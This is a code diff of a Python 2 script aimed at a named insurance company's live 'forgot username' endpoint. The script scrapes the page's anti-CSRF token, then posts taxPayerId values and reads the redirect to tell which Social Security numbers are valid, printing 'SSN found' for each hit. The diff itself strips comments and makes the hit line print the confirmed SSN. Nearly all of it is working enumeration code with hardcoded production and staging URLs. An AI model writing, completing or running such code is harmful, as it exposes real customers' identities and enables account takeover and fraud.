@@ -14,20 +14,17 @@ except ImportError, e:
 
 def get_token(session, url):
     gr = session.get(url, verify=False)
-    # access response and retrieve anti-csurf token
     tree = lh.fromstring(gr.content)
     token = tree.xpath('//input[@name="org.apache.struts.taglib.html.TOKEN"]/@value')[0]
     return token
 
-# POST SSN request with token
-## TODO: add ssn range as argument to post_ssn function
 def post_ssn(session, url, data):
     pr = session.post(url, data=data, verify=False, allow_redirects=False) 
     try:
         location = pr.headers['Location']
         #if location != 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameFailure.do':
         if location != 'https://service.northwesternmutual.com/CXID/forgotUserNameFailure.do':
-            print 'SSN found: ' ## TODO add in with argument ## %s' %(ssn)
+            print 'SSN found: %s' %data['taxPayerId']
         else:
             print 'Bad SSN: %s' %data['taxPayerId']
             print pr.status_code, pr.headers['location']
@@ -35,7 +32,6 @@ def post_ssn(session, url, data):
         print "No 'Location' Header was returned by the server"
 
 def main():
-    # establish vars
     #url = 'https://servicestage.northwesternmutual.com/CXID/forgotUserNameIdentification.do'
     url = 'https://service.northwesternmutual.com/CXID/forgotUserNameIdentification.do'
     token = str()
